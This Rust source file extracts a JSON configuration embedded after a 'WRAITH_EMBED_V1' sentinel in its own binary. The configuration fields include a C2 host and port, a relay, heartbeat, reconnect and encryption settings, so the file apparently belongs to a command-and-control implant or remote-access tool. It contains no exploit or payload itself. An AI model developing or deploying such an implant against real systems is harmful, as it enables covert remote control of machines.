//! Sentinel-based config embedding — mirrors the SHELLY_EMBED_V1 pattern.

use serde::Deserialize;
use std::env;
use std::fs;
use std::io::Read;
use std::path::PathBuf;

pub const WRAITH_EMBED_V1: &[u8] = b"WRAITH_EMBED_V1";

#[derive(Debug, Clone, Deserialize)]
pub struct EmbeddedConfig {
    #[serde(default = "default_relay_host")]
    pub relay_host: String,
    #[serde(default = "default_relay_port")]
    pub relay_port: u16,
    #[serde(default = "default_c2_host")]
    pub c2_host: String,
    #[serde(default = "default_c2_port")]
    pub c2_port: u16,
    #[serde(default = "default_reconnect")]
    pub reconnect: bool,
    #[serde(default = "default_reconnect_delay")]
    pub reconnect_delay: u64,
    #[serde(default = "default_heartbeat_interval")]
    pub heartbeat_interval: u64,
    #[serde(default = "default_encryption")]
    pub encryption: String,
    #[serde(default = "default_log_level")]
    pub log_level: String,
    #[serde(default = "default_tunnel_ip")]
    pub tunnel_ip: String,
}

fn default_relay_host() -> String {
    "127.0.0.1".to_string()
}

fn default_relay_port() -> u16 {
    4446
}

fn default_c2_host() -> String {
    "127.0.0.1".to_string()
}

fn default_c2_port() -> u16 {
    4445
}

fn default_reconnect() -> bool {
    true
}

fn default_reconnect_delay() -> u64 {
    5
}

fn default_heartbeat_interval() -> u64 {
    30
}

fn default_encryption() -> String {
    "chacha20".to_string()
}

fn default_log_level() -> String {
    "info".to_string()
}

fn default_tunnel_ip() -> String {
    "10.8.0.2".to_string()
}

fn get_own_binary_path() -> Option<PathBuf> {
    env::current_exe().ok()
}

/// Search the running binary for a WRAITH_EMBED_V1 sentinel and extract config.
pub fn find_embedded_config() -> Option<EmbeddedConfig> {
    let binary_path = get_own_binary_path()?;

    let mut file = fs::File::open(&binary_path).ok()?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer).ok()?;

    let sentinel = WRAITH_EMBED_V1;

    if let Some(pos) = find_sentinel_last(&buffer, sentinel) {
        let after_sentinel = pos + sentinel.len();

        if after_sentinel + 4 > buffer.len() {
            return None;
        }

        let length_bytes: [u8; 4] = buffer[after_sentinel..after_sentinel + 4].try_into().ok()?;
        let length = u32::from_be_bytes(length_bytes) as usize;

        let config_start = after_sentinel + 4;
        let config_end = config_start.checked_add(length)?;

        if config_end > buffer.len() {
            return None;
        }

        let json_bytes = &buffer[config_start..config_end];
        let config: EmbeddedConfig = serde_json::from_slice(json_bytes).ok()?;
        Some(config)
    } else {
        None
    }
}

fn find_sentinel_last(buffer: &[u8], sentinel: &[u8]) -> Option<usize> {
    buffer.windows(sentinel.len()).rposition(|w| w == sentinel)
}
